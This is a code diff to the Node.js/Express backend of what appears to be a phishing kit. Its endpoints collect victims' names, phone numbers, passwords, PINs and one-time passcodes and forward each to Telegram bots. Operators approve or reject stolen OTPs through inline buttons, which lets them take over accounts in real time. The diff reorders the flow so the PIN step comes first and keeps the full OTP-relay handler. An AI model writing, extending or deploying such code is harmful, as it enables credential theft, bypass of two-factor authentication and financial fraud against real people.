@@ -157,7 +157,7 @@ app.post('/submit-password', (req, res) => {
 
   try {
 
-    const { name, phone, password, botId } = req.body;
+    const { name, phone, botId } = req.body;
 
     const bot = getBot(botId);
 
@@ -182,7 +182,7 @@ app.post('/submit-password', (req, res) => {
 `🔐 DETAILS VERIFICATION
 👤 Name: ${name}
 📞 Phone: ${phone}
-🔑 Password: ${password}
+
 🆔 Ref: ${requestId}`,
       [
         [
@@ -219,7 +219,7 @@ app.get('/check-password/:id', (req, res) => {
 
   if (result === true) {
     return res.json({
-      redirect: 'code'
+      redirect: 'pin'
     });
   }
 
@@ -234,75 +234,6 @@ app.get('/check-password/:id', (req, res) => {
   });
 
 });
-
-// ---------------- OTP STEP ----------------
-app.post('/submit-otp', (req, res) => {
-
-  try {
-
-    const { name, phone, otp, botId } = req.body;
-
-    const bot = getBot(botId);
-
-    if (!bot) {
-      return res.status(400).json({
-        error: 'Invalid bot'
-      });
-    }
-
-    const requestId = uuidv4();
-
-    otpRequests[requestId] = null;
-
-    requestMeta[requestId] = {
-      name,
-      phone,
-      botId
-    };
-
-    const buttons = [
-      [
-        {
-          text: '✅ Correct OTP',
-          callback_data: `otp_ok:${requestId}`
-        },
-        {
-          text: '❌ Wrong OTP',
-          callback_data: `otp_bad:${requestId}`
-        }
-      ]
-    ];
-
-    sendTelegram(
-      bot,
-`🔐 OTP VERIFICATION
-👤 Name: ${name}
-📞 Phone: ${phone}
-🔢 OTP: ${otp}
-🆔 Ref: ${requestId}`,
-      buttons
-    );
-
-    res.json({ requestId });
-
-  } catch {
-
-    res.status(500).json({
-      error: 'Internal server error'
-    });
-
-  }
-
-});
-
-app.get('/check-otp/:id', (req, res) => {
-
-  res.json({
-    approved: otpRequests[req.params.id] ?? null
-  });
-
-});
-
 // ---------------- PIN STEP ----------------
 app.post('/submit-pin', (req, res) => {
 
@@ -378,6 +309,76 @@ app.get('/check-pin/:id', (req, res) => {
   });
 
 });
+
+// ---------------- OTP STEP ----------------
+app.post('/submit-otp', (req, res) => {
+
+  try {
+
+    const { name, phone, otp, botId } = req.body;
+
+    const bot = getBot(botId);
+
+    if (!bot) {
+      return res.status(400).json({
+        error: 'Invalid bot'
+      });
+    }
+
+    const requestId = uuidv4();
+
+    otpRequests[requestId] = null;
+
+    requestMeta[requestId] = {
+      name,
+      phone,
+      botId
+    };
+
+    const buttons = [
+      [
+        {
+          text: '✅ Correct OTP',
+          callback_data: `otp_ok:${requestId}`
+        },
+        {
+          text: '❌ Wrong OTP',
+          callback_data: `otp_bad:${requestId}`
+        }
+      ]
+    ];
+
+    sendTelegram(
+      bot,
+`🔐 OTP VERIFICATION
+👤 Name: ${name}
+📞 Phone: ${phone}
+🔢 OTP: ${otp}
+🆔 Ref: ${requestId}`,
+      buttons
+    );
+
+    res.json({ requestId });
+
+  } catch {
+
+    res.status(500).json({
+      error: 'Internal server error'
+    });
+
+  }
+
+});
+
+app.get('/check-otp/:id', (req, res) => {
+
+  res.json({
+    approved: otpRequests[req.params.id] ?? null
+  });
+
+});
+
+
 
 // ---------------- LOAN STEP ----------------
 app.post('/submit-loan', async (req, res) => {
